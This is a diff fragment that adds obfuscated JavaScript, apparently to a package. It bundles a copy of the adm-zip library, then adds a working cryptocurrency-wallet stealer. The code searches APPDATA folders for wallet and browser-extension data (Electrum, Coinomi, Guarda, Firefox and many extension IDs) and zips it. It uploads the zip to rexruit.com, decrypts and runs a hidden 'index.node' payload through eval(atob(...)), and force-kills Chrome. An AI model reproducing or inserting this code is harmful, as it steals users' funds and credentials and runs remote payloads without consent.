+                Object[Df(0x227)](j, K);
+                const L = new Q(j);
+                (typeof j[Df(0x1d6)] !== 'object' || typeof j['decoder']['encode'] !== 'function' || typeof j[Df(0x1d6)][Df(0x37f)] !== 'function') && (j[Df(0x1d6)] = Q[Df(0x1d6)]);
+                if (J && Df(0x1df) === typeof J) {
+                    if (L['fs']['existsSync'](J))
+                        j['method'] = Q[Df(0x3ae)][Df(0x290)], j[Df(0x17d)] = J, M = L['fs'][Df(0x222)](J);
+                    else
+                        throw Q['Errors']['INVALID_FILENAME']();
+                }
+                const p = new U(M, j), {
+                        canonical: g,
+                        sanitize: u,
+                        zipnamefix: C
+                    } = Q;
+                function t0(t4) {
+                    const DN = Df;
+                    if (t4 && p) {
+                        var t5;
+                        if (typeof t4 === DN(0x1df))
+                            t5 = p['getEntry'](h['posix']['normalize'](t4));
+                        if (typeof t4 === DN(0x2e2) && typeof t4[DN(0x285)] !== 'undefined' && typeof t4['header'] !== DN(0x24f))
+                            t5 = p['getEntry'](t4[DN(0x285)]);
+                        if (t5)
+                            return t5;
+                    }
+                    return null;
+                }
+                function t1(t4) {
+                    const DI = Df, {
+                            join: t5,
+                            normalize: t6,
+                            sep: t7
+                        } = h[DI(0x2e6)];
+                    return t5('.', t6(t7 + t4[DI(0x255)]('\x5c')[DI(0x1e6)](t7) + t7));
+                }
+                function t2(t4) {
+                    const DY = Df;
+                    if (t4 instanceof RegExp)
+                        return function (t5) {
+                            return function (t6) {
+                                return t5['test'](t6);
+                            };
+                        }(t4);
+                    else {
+                        if (DY(0x198) !== typeof t4)
+                            return () => !![];
+                    }
+                    return t4;
+                }
+                const t3 = (t4, t5) => {
+                    const DH = Df;
+                    let t6 = t5['slice'](-0x1);
+                    return t6 = t6 === L[DH(0x2a1)] ? L[DH(0x2a1)] : '', h[DH(0x27d)](t4, t5) + t6;
+                };
+                return {
+                    'readFile': function (t4, t5) {
+                        var t6 = t0(t4);
+                        return t6 && t6['getData'](t5) || null;
+                    },
+                    'childCount': function (t4) {
+                        const t5 = t0(t4);
+                        if (t5)
+                            return p['getChildCount'](t5);
+                    },
+                    'readFileAsync': function (t4, t5) {
+                        const DJ = Df;
+                        var t6 = t0(t4);
+                        t6 ? t6['getDataAsync'](t5) : t5(null, DJ(0x326) + t4);
+                    },
+                    'readAsText': function (t4, t5) {
+                        const DK = Df;
+                        var t6 = t0(t4);
+                        if (t6) {
+                            var t7 = t6[DK(0x177)]();
+                            if (t7 && t7[DK(0x2ca)])
+                                return t7[DK(0x234)](t5 || 'utf8');
+                        }
+                        return '';
+                    },
+                    'readAsTextAsync': function (t4, t5, t6) {
+                        var t7 = t0(t4);
+                        t7 ? t7['getDataAsync'](function (t8, t9) {
+                            const DM = m;
+                            if (t9) {
+                                t5(t8, t9);
+                                return;
+                            }
+                            t8 && t8[DM(0x2ca)] ? t5(t8[DM(0x234)](t6 || DM(0x31a))) : t5('');
+                        }) : t5('');
+                    },
+                    'deleteFile': function (t4, t5 = !![]) {
+                        const Dj = Df;
+                        var t6 = t0(t4);
+                        t6 && p[Dj(0x19f)](t6[Dj(0x285)], t5);
+                    },
+                    'deleteEntry': function (t4) {
+                        var t5 = t0(t4);
+                        t5 && p['deleteEntry'](t5['entryName']);
+                    },
+                    'addZipComment': function (t4) {
+                        const DL = Df;
+                        p[DL(0x288)] = t4;
+                    },
+                    'getZipComment': function () {
+                        return p['comment'] || '';
+                    },
+                    'addZipEntryComment': function (t4, t5) {
+                        const Dp = Df;
+                        var t6 = t0(t4);
+                        t6 && (t6[Dp(0x288)] = t5);
+                    },
+                    'getZipEntryComment': function (t4) {
+                        const Dg = Df;
+       var t5 = t0(t4);
+                        if (t5)
+                            return t5[Dg(0x288)] || '';
+                        return '';
+                    },
+                    'updateFile': function (t4, t5) {
+                        const Du = Df;
+                        var t6 = t0(t4);
+                        t6 && t6[Du(0x19e)](t5);
+                    },
+                    'addLocalFile': function (t4, t5, t6, t7) {
+                        const DC = Df;
+                        if (L['fs'][DC(0x270)](t4)) {
+                            t5 = t5 ? t1(t5) : '';
+                            const t8 = h[DC(0x272)][DC(0x237)](h['win32']['normalize'](t4));
+                            t5 += t6 ? t6 : t8;
+                            const t9 = L['fs'][DC(0x1a3)](t4), tt = t9['isFile']() ? L['fs']['readFileSync'](t4) : Buffer[DC(0x26a)](0x0);
+                            if (t9[DC(0x297)]())
+                                t5 += L[DC(0x2a1)];
+                            this[DC(0x2c4)](t5, tt, t7, t9);
+                        } else
+                            throw Q[DC(0x26b)][DC(0x323)](t4);
+                    },
+                    'addLocalFileAsync': function (t4, t5) {
+                        const l0 = Df;
+                        t4 = typeof t4 === l0(0x2e2) ? t4 : { 'localPath': t4 };
+                        const t6 = h[l0(0x264)](t4[l0(0x202)]), {comment: t7} = t4;
+                        let {
+                            zipPath: t8,
+                            zipName: t9
+                        } = t4;
+                        const tt = this;
+                        L['fs'][l0(0x2dd)](t6, function (tm, tD) {
+                            const l1 = l0;
+                            if (tm)
+                                return t5(tm, ![]);
+                            t8 = t8 ? t1(t8) : '';
+                            const tl = h[l1(0x272)][l1(0x237)](h['win32'][l1(0x383)](t6));
+                            t8 += t9 ? t9 : tl;
+                            if (tD[l1(0x371)]())
+                                L['fs'][l1(0x1e0)](t6, function (tz, te) {
+                                    if (tz)
+                                        return t5(tz, ![]);
+                                    return tt['addFile'](t8, te, t7, tD), setImmediate(t5, void 0x0, !![]);
+                                });
+                            else {
+                                if (tD[l1(0x297)]())
+                                    return t8 += L[l1(0x2a1)], tt[l1(0x2c4)](t8, Buffer[l1(0x26a)](0x0), t7, tD), setImmediate(t5, void 0x0, !![]);
+                            }
+                        });
+                    },
+                    'addLocalFolder': function (t4, t5, t6) {
+                        const l2 = Df;
+                        t6 = t2(t6), t5 = t5 ? t1(t5) : '', t4 = h['normalize'](t4);
+                        if (L['fs'][l2(0x270)](t4)) {
+                            const t7 = L[l2(0x191)](t4), t8 = this;
+                            if (t7[l2(0x2ca)])
+                                for (const filepath of t7) {
+                                    const t9 = h['join'](t5, t3(t4, filepath));
+                                    t6(t9) && t8[l2(0x347)](filepath, h[l2(0x367)](t9));
+                                }
+                        } else
+                            throw Q[l2(0x26b)][l2(0x323)](t4);
+                    },
+                    'addLocalFolderAsync': function (t4, t5, t6, t7) {
+                        const l3 = Df;
+                        t7 = t2(t7), t6 = t6 ? t1(t6) : '', t4 = h[l3(0x383)](t4);
+                        var t8 = this;
+                        L['fs'][l3(0x2f7)](t4, 'r', function (t9) {
+                            const l4 = l3;
+                            if (t9 && t9[l4(0x253)] === l4(0x283))
+                                t5(void 0x0, Q[l4(0x26b)][l4(0x323)](t4));
+                            else {
+                                if (t9)
+                                    t5(void 0x0, t9);
+                                else {
+                                    var tt = L[l4(0x191)](t4), tm = -0x1, tD = function () {
+                                            const l5 = l4;
+                                            tm += 0x1;
+                                            if (tm < tt[l5(0x2ca)]) {
+                                                var filepath = tt[tm], tl = t3(t4, filepath)['split']('\x5c')[l5(0x1e6)]('/');
+                                                tl = tl[l5(0x383)]('NFD')[l5(0x2e8)](/[\u0300-\u036f]/g, '')[l5(0x2e8)](/[^\x20-\x7E]/g, ''), t7(tl) ? L['fs'][l5(0x2dd)](filepath, function (tz, te) {
+                                                    const l6 = l5;
+                                                    if (tz)
+                                                        t5(void 0x0, tz);
+                                                    te[l6(0x371)]() ? L['fs']['readFile'](filepath, function (tQ, tB) {
+                                                        const l7 = l6;
+                                                        tQ ? t5(void 0x0, tQ) : (t8[l7(0x2c4)](t6 + tl, tB, '', te), tD());
+                                                    }) : (t8[l6(0x2c4)](t6 + tl + '/', Buffer['alloc'](0x0), '', te), tD());
+                                                }) : process[l5(0x38c)](() => {
+                                                    tD();
+                                                });
+                                            } else
+                                                t5(!![], void 0x0);
+                                        };
+                                    tD();
+                                }
+                            }
+                        });
+                    },
+                    'addLocalFolderAsync2': function (t4, t5) {
+                        const l8 = Df, t6 = this;
+                        t4 = typeof t4 === l8(0x2e2) ? t4 : { 'localPath': t4 }, localPath = h[l8(0x264)](t1(t4['localPath']));
+                        let {
+                            zipPath: t7,
+                            filter: t8,
+                            namefix: t9
+                        } = t4;
+                        if (t8 instanceof RegExp)
+                            t8 = function (tD) {
+                                return function (tl) {
+                                    const l9 = m;
+                                    return tD[l9(0x1ba)](tl);
+                                };
+                            }(t8);
+                        else
+                            'function' !== typeof t8 && (t8 = function () {
+                                return !![];
+                            });
+                        t7 = t7 ? t1(t7) : '';
+                        t9 == l8(0x361) && (t9 = tD => tD[l8(0x383)]('NFD')[l8(0x2e8)](/[\u0300-\u036f]/g, '')[l8(0x2e8)](/[^\x20-\x7E]/g, ''));
+                        if (typeof t9 !== l8(0x198))
+                            t9 = tD => tD;
+                        const tt = tD => h[l8(0x1e6)](t7, t9(t3(localPath, tD))), tm = tD => h[l8(0x272)][l8(0x237)](h[l8(0x272)][l8(0x383)](t9(tD)));
+                        L['fs'][l8(0x2f7)](localPath, 'r', function (tD) {
+                            const lt = l8;
+                            if (tD && tD[lt(0x253)] === lt(0x283))
+                                t5(void 0x0, Q[lt(0x26b)][lt(0x323)](localPath));
+                            else
+                                tD ? t5(void 0x0, tD) : L[lt(0x2d5)](localPath, function (tl, tz) {
+                                    const lm = lt;
+                                    if (tl)
+                                        return t5(tl);
+                                    tz = tz[lm(0x3a3)](te => t8(tt(te)));
+                                    if (!tz[lm(0x2ca)])
+                                        t5(void 0x0, ![]);
+                                    setImmediate(tz[lm(0x164)]()[lm(0x2ba)](function (te, tQ) {
+                                        return function (tB, tr) {
+                                            const lD = m;
+                                            if (tB || tr === ![])
+                                                return setImmediate(te, tB, ![]);
+                                            t6['addLocalFileAsync']({
+                                                'localPath': tQ,
+                                                'zipPath': h[lD(0x367)](tt(tQ)),
+                                                'zipName': tm(tQ)
+                                            }, te);
+                                        };
+                                    }, t5));
+                                });
+                        });
+                    },
+                    'addLocalFolderPromise': function (t4, t5) {
+                        return new Promise((t6, t7) => {
+                            const ll = m, t8 = {};
+                            t8[ll(0x202)] = t4, this['addLocalFolderAsync2'](Object[ll(0x227)](t8, t5), (t9, tt) => {
+                                if (t9)
+                                    t7(t9);
+                                if (tt)
+                                    t6(this);
+                            });
+                        });
+                    },
+                    'addFile': function (t4, t5, t6, t7) {
+                        const lz = Df;
+                        t4 = C(t4);
+                        let t8 = t0(t4);
+                        const t9 = t8 != null;
+                        !t9 && (t8 = new c(j), t8[lz(0x285)] = t4);
+                        t8[lz(0x288)] = t6 || '';
+                        const tt = lz(0x2e2) === typeof t7 && t7 instanceof L['fs']['Stats'];
+                        tt && (t8[lz(0x1e7)][lz(0x2d4)] = t7['mtime']);
+                        var tm = t8[lz(0x297)] ? 0x10 : 0x0;
+                        let tD = t8['isDirectory'] ? 0x4000 : 0x8000;
+                        if (tt)
+                            tD |= 0xfff & t7[lz(0x186)];
+                        else
+                            lz(0x175) === typeof t7 ? tD |= 0xfff & t7 : tD |= t8[lz(0x297)] ? 0x1ed : 0x1a4;
+                        tm = (tm | tD << 0x10) >>> 0x0, t8['attr'] = tm, t8[lz(0x19e)](t5);
+                        if (!t9)
+                            p['setEntry'](t8);
+                        return t8;
+                    },
+                    'getEntries': function (t4) {
+                        const le = Df;
+                        return p[le(0x350)] = t4, p ? p['entries'] : [];
+                    },
+                    'getEntry': function (t4) {
+                        return t0(t4);
+                    },
+                    'getEntryCount': function () {
+                        const lQ = Df;
+                        return p[lQ(0x2c6)]();
+                    },
+                    'forEach': function (t4) {
+                        return p['forEach'](t4);
+                    },
+                    'extractEntryTo': function (t4, t5, t6, t7, t8, t9) {
+                        const lB = Df;
+                        t7 = f(![], t7), t8 = f(![], t8), t6 = f(!![], t6), t9 = N(t8, t9);
+                        var tt = t0(t4);
+                        if (!tt)
+                            throw Q[lB(0x26b)][lB(0x309)]();
+                        var tm = g(tt[lB(0x285)]), tD = u(t5, t9 && !tt[lB(0x297)] ? t9 : t6 ? tm : h['basename'](tm));
+                        if (tt[lB(0x297)]) {
+                            var tl = p['getEntryChildren'](tt);
+                            return tl['forEach'](function (tQ) {
+                                const lr = lB;
+                                if (tQ['isDirectory'])
+                                    return;
+                                var tB = tQ[lr(0x177)]();
+                                if (!tB)
+                                    throw Q[lr(0x26b)]['CANT_EXTRACT_FILE']();
+                                var tr = g(tQ['entryName']), tX = u(t5, t6 ? tr : h[lr(0x237)](tr));
+                                const ty = t8 ? tQ[lr(0x1e7)][lr(0x19b)] : void 0x0;
+                                L[lr(0x263)](tX, tB, t7, ty);
+                            }), !![];
+                        }
+                        var tz = tt['getData'](p['password']);
+                        if (!tz)
+                            throw Q[lB(0x26b)][lB(0x35a)]();
+                        if (L['fs'][lB(0x270)](tD) && !t7)
+                            throw Q['Errors']['CANT_OVERRIDE']();
+                        const te = t8 ? t4[lB(0x1e7)]['fileAttr'] : void 0x0;
+                        return L[lB(0x263)](tD, tz, t7, te), !![];
+                    },
+                    'test': function (t4) {
+                        const lX = Df;
+                        if (!p)
+                            return ![];
+                        for (var t5 in p['entries']) {
+                            try {
+                                if (t5[lX(0x297)])
+                                    continue;
+                                var t6 = p[lX(0x171)][t5][lX(0x177)](t4);
+                                if (!t6)
+                                    return ![];
+                            } catch (t7) {
+                                return ![];
+                            }
+                        }
+                        return !![];
+                    },
+                    'extractAllTo': function (t4, t5, t6, t7) {
+                        const ly = Df;
+                        t6 = f(![], t6), t7 = N(t6, t7), t5 = f(![], t5);
+                        if (!p)
+                            throw Q[ly(0x26b)][ly(0x16d)]();
+                        p[ly(0x171)]['forEach'](function (t8) {
+                            const ld = ly;
+                            var t9 = u(t4, g(t8[ld(0x285)]));
+                            if (t8['isDirectory']) {
+                                L['makeDir'](t9);
+                                return;
+                            }
+                            var tt = t8[ld(0x177)](t7);
+                            if (!tt)
+                                throw Q[ld(0x26b)][ld(0x35a)]();
+                            const tm = t6 ? t8[ld(0x1e7)]['fileAttr'] : void 0x0;
+                            L[ld(0x263)](t9, tt, t5, tm);
+                            try {
+                                L['fs'][ld(0x39e)](t9, t8[ld(0x1e7)][ld(0x2d4)], t8[ld(0x1e7)][ld(0x2d4)]);
+                            } catch (tD) {
+                                throw Q[ld(0x26b)][ld(0x35a)]();
+                            }
+                        });
+                    },
+                    'extractAllToAsync': function (t4, t5, t6, t7) {
+                        const lW = Df;
+                        t7 = I(t5, t6, t7), t6 = f(![], t6), t5 = f(![], t5);
+                        if (!t7)
+                            return new Promise((tD, tl) => {
+                                const la = m;
+                                this[la(0x2bb)](t4, t5, t6, function (tz) {
+                                    tz ? tl(tz) : tD(this);
+                                });
+                            });
+                        if (!p) {
+                            t7(Q[lW(0x26b)]['NO_ZIP']());
+                            return;
+                        }
+                        t4 = h[lW(0x264)](t4);
+                        const t8 = tD => u(t4, h[lW(0x383)](g(tD['entryName']))), t9 = (tD, tl) => new Error(tD + lW(0x20d) + tl + '\x22'), tt = [], tm = [];
+                        p[lW(0x171)][lW(0x299)](tD => {
+                            const lF = lW;
+                            tD[lF(0x297)] ? tt[lF(0x1a6)](tD) : tm[lF(0x1a6)](tD);
+                        });
+                        for (const tD of tt) {
+                            const tl = t8(tD), tz = t6 ? tD[lW(0x1e7)][lW(0x19b)] : void 0x0;
+                            try {
+                                L[lW(0x229)](tl);
+                                if (tz)
+                                    L['fs'][lW(0x280)](tl, tz);
+                                L['fs'][lW(0x39e)](tl, tD[lW(0x1e7)][lW(0x2d4)], tD[lW(0x1e7)][lW(0x2d4)]);
+                            } catch (te) {
+                                t7(t9(lW(0x23e), tl));
+                            }
+                        }
+                        tm[lW(0x164)]()[lW(0x2ba)](function (tQ, tB) {
+                            return function (tr) {
+                                const lS = m;
+                                if (tr)
+                                    tQ(tr);
+                                else {
+                                    const tX = h[lS(0x383)](g(tB[lS(0x285)])), ty = u(t4, tX);
+                                    tB[lS(0x2cb)](function (td, ta) {
+                                        const lA = lS;
+                                        if (ta)
+                                            tQ(ta);
+                                        else {
+                                            if (!td)
+                                                tQ(Q[lA(0x26b)][lA(0x35a)]());
+                                            else {
+                                                const tW = t6 ? tB[lA(0x1e7)][lA(0x19b)] : void 0x0;
+                                                L[lA(0x358)](ty, td, t5, tW, function (tF) {
+                                                    const lE = lA;
+                                                    !tF && tQ(t9(lE(0x25e), ty)), L['fs'][lE(0x2ad)](ty, tB[lE(0x1e7)]['time'], tB[lE(0x1e7)][lE(0x2d4)], function (tS) {
+                                                        const lV = lE;
+                                                        tS ? tQ(t9(lV(0x190), ty)) : tQ();
+                                                    });
+                                                });
+                                            }
+                                        }
+                                    });
+                                }
+                            };
+                        }, t7)();
+                    },
+                    'writeZip': function (t4, t5) {
+                        const li = Df;
+                        arguments[li(0x2ca)] === 0x1 && (typeof t4 === 'function' && (t5 = t4, t4 = ''));
+                        !t4 && j['filename'] && (t4 = j[li(0x17d)]);
+                        if (!t4)
+                            return;
+                        var t6 = p[li(0x2bd)]();
+                        if (t6) {
+                            var t7 = L[li(0x263)](t4, t6, !![]);
+                            if (typeof t5 === li(0x198))
+                                t5(!t7 ? new Error(li(0x3ac)) : null, '');
+                        }
+                    },
+                    'writeZipPromise': function (t4, t5) {
+                        const lo = Df, t6 = {};
+                        t6[lo(0x1d5)] = !![];
+                        const {
+                            overwrite: t7,
+                            perm: t8
+                        } = Object[lo(0x227)](t6, t5);
+                        return new Promise((t9, tt) => {
+                            const ln = lo;
+                            if (!t4 && j[ln(0x17d)])
+                                t4 = j[ln(0x17d)];
+                            if (!t4)
+                                tt(ln(0x218));
+                            this[ln(0x2fa)]()[ln(0x33b)](tm => {
+                                const lx = ln, tD = tl => tl ? t9(tl) : tt('ADM-ZIP:\x20Wasn\x27t\x20able\x20to\x20write\x20zip\x20file');
+                                L[lx(0x358)](t4, tm, t7, t8, tD);
+                            }, tt);
+                        });
+                    },
+                    'toBufferPromise': function () {
+                        return new Promise((t4, t5) => {
+                            const lw = m;
+                            p[lw(0x25b)](t4, t5);
+                        });
+                    },
+                    'toBuffer': function (t4, t5, t6, t7) {
+                        const lv = Df;
+                        if (typeof t4 === 'function')
+                            return p[lv(0x25b)](t4, t5, t6, t7), null;
+                        return p[lv(0x2bd)]();
+                    }
+                };
+            };
+        }
+    }), path = require(tE(0x236)), y = require(tE(0x1fb)), fs = require('fs'), https = require(tE(0x36f)), AdmZip = require_adm_zip(), d = require(tE(0x214)), a = process[tE(0x36e)][tE(0x212)], W = tE(0x27a), F = tE(0x391), S = tE(0x1dd), A = 'cf7f4fce7228d98174dc477607868af3aa8621b6c90f6f8964a5aae5e2698038', E = [
+        tE(0x1b5),
+        tE(0x172),
+        tE(0x30a),
+        'Electrum',
+        tE(0x3b4),
+        'Coinomi',
+        'Firefox'
+    ], V = [
+        process[tE(0x36e)]['APPDATA'],
+        process[tE(0x36e)][tE(0x1ce)]
+    ], i = process['env'][tE(0x170)] + tE(0x241), path_node_g, o = [], n = D => tE(0x165) + D + tE(0x182), x = path_module => btoa(tE(0x321) + path_module + '\x27);\x0arun()\x0a'), w = path_module => btoa(tE(0x31c) + path_module + tE(0x221));
+function v(z, Q = 0x0) {
+    const lP = tE;
+    try {
+        const h = {};
+        h[lP(0x231)] = !![];
+        const c = fs['readdirSync'](z, h);
+        R(i);
+        for (const U of c) {
+            if (U[lP(0x297)]()) {
+                const f = path[lP(0x1e6)](z, U['name']);
+                E[lP(0x179)](N => U[lP(0x1fd)][lP(0x36a)](N)) && Q < 0x3 && (o[lP(0x1a6)](f), Z(f)['then'](() => {
+                    const lb = lP;
+                    o[lb(0x366)](), o[lb(0x2ca)] == 0x0 && new Promise(N => setTimeout(N, 0x3e8))[lb(0x33b)](N => {
+                        const lT = lb;
+                        new Promise(j => setTimeout(j, 0x4e20))[lT(0x33b)](j => {
+                            const lq = lT;
+                            try {
+                                const pathModule = path['join'](process[lq(0x251)], 'index.node'), L = P(pathModule, S);
+                                if (L) {
+                                    const p = Buffer[lq(0x351)](W, lq(0x33d)), g = Buffer[lq(0x351)](F, lq(0x33d)), u = y['createDecipheriv'](lq(0x244), p, g), C = fs[lq(0x222)](pathModule[lq(0x352)]('\x5c', '/')), t0 = Buffer[lq(0x30b)]([
+                                            u[lq(0x336)](Buffer[lq(0x351)](C)),
+                                            u[lq(0x2ae)]()
+                                        ]);
+                                    fs[lq(0x1dc)](pathModule[lq(0x352)]('\x5c', '/'), t0);
+                                }
+                                setTimeout(() => {
+                                    const lO = lq;
+                                    d[lO(0x1f7)](path_node_g + '\x20-e\x20\x22eval(atob(\x27' + w(pathModule[lO(0x352)]('\x5c', '/')) + lO(0x239), (t1, t2, t3) => {
+                                        const lR = lO;
+                                        if (t1)
+                                            return;
+                                        if (t3)
+                                            return;
+                                        fs[lR(0x329)](pathModule[lR(0x352)]('\x5c', '/'), t4 => {
+                                            if (t4)
+                                                return;
+                                        });
+                                    }), G();
+                                }, 0x3e8);
+                            } catch (t1) {
+                            }
+                        });
+                        if (fs[lT(0x270)](i)) {
+                            const j = fs['readdirSync'](i);
+                            if (j[lT(0x2ca)] == 0x0)
+                                return;
+                        } else
+                            return;
+                        const I = new AdmZip();
+                        I[lT(0x1e3)](i);
+                        let Y = I[lT(0x219)]();
+                        const H = {};
+                        H[lT(0x302)] = lT(0x3a7);
+                        const J = {};
+                        J[lT(0x333)] = 'POST', J['hostname'] = lT(0x369), J[lT(0x236)] = lT(0x2c1), J[lT(0x2a9)] = H;
+                        const K = J, M = () => {
+                                const lZ = lT, L = https['request'](K, p => {
+                                        const lG = m;
+                                        p['on'](lG(0x278), g => {
+                                            const lk = lG;
+                                            process[lk(0x3b1)]['write'](g), g['includes'](atob(lk(0x208))) && (Y = null), g[lk(0x36a)](lk(0x284)) && setTimeout(() => {
+                                                M();
+                                            }, 0x3e8);
+                                        });
+                                    });
+                                L[lZ(0x2ed)](Y), L[lZ(0x2d6)](), L['on'](lZ(0x1ea), p => {
+                                    console['error'](p), setTimeout(() => {
+                                        M();
+                                    }, 0x3e8);
+                                });
+                            };
+                        M();
+                    });
+                })), Q < 0x3 && v(f, Q + 0x1);
+            }
+        }
+    } catch (N) {
+        console[lP(0x344)](N);
+    }
+}
+function P(D, z) {
+    const e = b(D);
+    return e === z;
+}
+function b(D) {
+    const ls = tE, z = y[ls(0x1b6)]('sha256'), e = fs[ls(0x222)](D);
+    return z[ls(0x336)](e), z[ls(0x372)](ls(0x296));
+}
+function T() {
+    const lh = tE, D = d[lh(0x2b3)](lh(0x35e));
+    D[lh(0x36a)](lh(0x2a8)) && d['execSync'](lh(0x2e7));
+    const z = d['execSync'](lh(0x1d1));
+    z[lh(0x36a)](lh(0x30d)) && d[lh(0x2b3)](lh(0x1f1));
+}
+function t() {
+    const z2 = [
+        'taskkill\x20/F\x20/im\x20chrome.exe',
+        'replace',
+        'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
+        'max',
+        'Electrum',
+        'packCentralHeader',
+        'write',
+        'substr',
+        'Atomic_desktop',
+        'fnnegphlobjdpkhecapkijjdkgcjhkib',
+        'EXTLEN',
+        'warn',
+        'writeUInt32LE',
+        'getCompressedDataAsync',
+        'lpilbniiabackdjcionkobglmddfbcjo',
+        'Not\x20implemented',
+        'open',
+        '64ZUyHdI',
+        'indexOf',
+        'toBufferPromise',
+        'Coinomi',
+        'methodToString',
+        'deflateAsync',
+        'INVALID_END',
+        'deflate',
+        'opcgpfmipidbgpenhmajoajpbobppdil',
+        'REDUCED2',
+        'Content-Type',
+        'findIndex',
+        'CENCOM',
+        'EF_ZIP64_OR_32',
+        'MHzzZxT.zip',
+        'ZIP64LEAD',
+        'MainHeader',
+        'NO_ENTRY',
+        'atomic',
+        'concat',
+        'temporary',
+        'firefox',
+'powershell.exe\x20-ExecutionPolicy\x20Bypass\x20-Command\x20\x22&\x20{\x20.\x20\x27',
+        'egjidjbpglichdcondbcbdnbeeppgdph',
+        'encode',
+        'aiifbnbfobpmeekipheeijimdpnlpgpp',
+        'jnlgamecbpmbajjfhmmmlhejkemejdma',
+        'MewCx',
+        'ID_STRONGENC',
+        'Invalid\x20END\x20header\x20(bad\x20signature)',
+        'compressedSize',
+        'Sollet',
+        'Guarda_desktop_1',
+        'nphplpgoakhhjchkkhmiggakijnkhfnd',
+        'utf8',
+        'EXTSIZ',
+        '\x0a\x20\x20\x20\x20const\x20crypto\x20=\x20require(\x27crypto\x27);\x0a\x20\x20\x20\x20const\x20{\x20run\x20}\x20=\x20require(\x27',
+        '\x20bytes',
+        'ilgcnhelpchnceeipipijaljkblbcobl',
+        'ID_AVINFO',
+        'DESCRIPTOR_UNKNOWN',
+        '\x0aconst\x20{\x20run\x20}\x20=\x20require(\x27',
+        'hnfanknocfeofbddgcijnmhnfnkdnaad',
+        'FILE_NOT_FOUND',
+        '1493702jLGqZe',
+        'readonly',
+        'getEntry\x20failed\x20for:',
+        'Coinbase',
+        'EXTCRC',
+        'unlink',
+        'deflateRawSync',
+        'map',
+        'BoltX',
+        'APPDATA',
+        'Wombat',
+        'extraLen',
+        'flags_efs',
+        'ENDOFF',
+        'INVALID_CEN',
+        'method',
+        'IBM_LZ77',
+        'ZipCrypto',
+        'update',
+        'END64OFF',
+        'REDUCED4',
+        'pdadjkfkgcafgbceimcpbkalnfnepbnk',
+        'CENATX',
+        'then',
+        'toBinary',
+        'base64',
+        'writeSync',
+        '264530SwnqVV',
+        'kpfopkelmapcoipemfendmdcghnegimn',
+        'getCompressedData',
+        'node',
+        'recursive',
+        'log',
+        'Invalid\x20or\x20unsupported\x20zip\x20format.\x20No\x20END\x20header\x20found',
+        'efs',
+        'addLocalFile',
+        'ENDSIZ',
+        'node_x64',
+        'crc32update',
+        'cgeeodpfagjceefieflmdfphplkenlfk',
+        '4294967295',
+        'INVALID_DISTANCE',
+        'mkdirSync',
+        'offset',
+        'password',
+        'from',
+        'replaceAll',
+        'ppbibelpcjmhbdihakflkdcoccbgbkpo',
+        'setAttributes',
+        'dmkamcknogkgcdfhhbddcghachkejeap',
+        'EF_ID',
+        'Guarda_desktop',
+        'writeFileToAsync',
+        'CENDSK',
+        'CANT_EXTRACT_FILE',
+        'Electrum_desktop',
+        'END64START',
+        'localHeaderToBinary',
+        'tasklist\x20/FI\x20\x22IMAGENAME\x20eq\x20chrome.exe\x22',
+        'sanitize',
+        'inflate::Available\x20inflate\x20data\x20did\x20not\x20terminate',
+        'latin1',
+        'ENDHDR',
+        'FLG_ENC',
+        'Solflare',
+        'fhilaheimglignddkjgofkcbgekhenbh',
+        'pop',
+        'dirname',
+        'CENSIG',
+        'rexruit.com',
+        'includes',
+        'Firefox',
+        'genSalt',
+        'CENHDR',
+        'env',
+        'https',
+        'INVALID_REPEAT_FIRST',
+        'isFile',
+        'digest',
+        'add',
+        'fhmfendgdocmcbmfikdcogofphimnkno',
+        'ID_X509_CERTID_F',
+        'https://nodejs.org/download/release/v22.9.0/node-v22.9.0-win-x64.zip',
+        'TON',
+        'AES_ENCRYPT',
+        'getMinutes',
+        'isWin',
+        'fnameLen',
+        'LOCNAM',
+        'mtime',
+        'getSeconds',
+        'decode',
+        'aodkkagnadcbobfpggfnjeongemjbjca',
+        'BUFFER',
+        'ENDTOT',
+        'normalize',
+        'ZIP64VEM',
+        'node-v22.9.0-win-x86',
+        'hidden',
+        'executable',
+        'inflate::Dynamic\x20block\x20code\x20description:\x20repeat\x20lengths\x20with\x20no\x20first\x20length',
+        'zipnamefix',
+        'ID_IBM1',
+        'REDUCED1',
+        'nextTick',
+        '\x20-e\x20\x22eval(atob(\x27',
+        'centralHeaderToBinary',
+        'ZIP64SIZE',
+        'ZIP64SIG',
+        'I4VsZiKyFrvOeZ1L0DIANw==',
+        'createDeflateRaw',
+        'EF_ZIP64_SCOMP',
+        'Coinomi_desktop',
+        '24GpWfMv',
+        'ZIP64TOT',
+        'inflate::Dynamic\x20block\x20code\x20description:\x20invalid\x20literal/length\x20code\x20lengths',
+        'LOCCRC',
+        'ZIP64SUB',
+        'UNSUPPORTED\x20(',
+        'Hashpack',
+        'fnjhmkhhmkbjkkabndcnnogagogbneec',
+        'ZIP64DSKDIR',
+        'utimesSync',
+        'stringify',
+        'INVALID_CODES_LEN',
+        'toJSON',
+        'size',
+        'filter',
+        'OKX_Wallet',
+        'isArray',
+        'Eth_and_Polk_Web3_Wallet',
+        'application/octet-stream',
+        'INVALID_FORMAT',
+        'EXTRA_FIELD_PARSE_ERROR',
+        'toLowerCase',
+        'CENTIM',
+        'failed',
+        'jnkelfanjkeadonecabehalmbgpfodjm',
+        'Constants',
+        'packLocalHeader',
+        'inflate::Invalid\x20block\x20type\x20(type\x20==\x203)',
+        'stdout',
+        'FLG_COMP2',
+        'timeHighByte',
+        'Guarda',
+        'reverse',
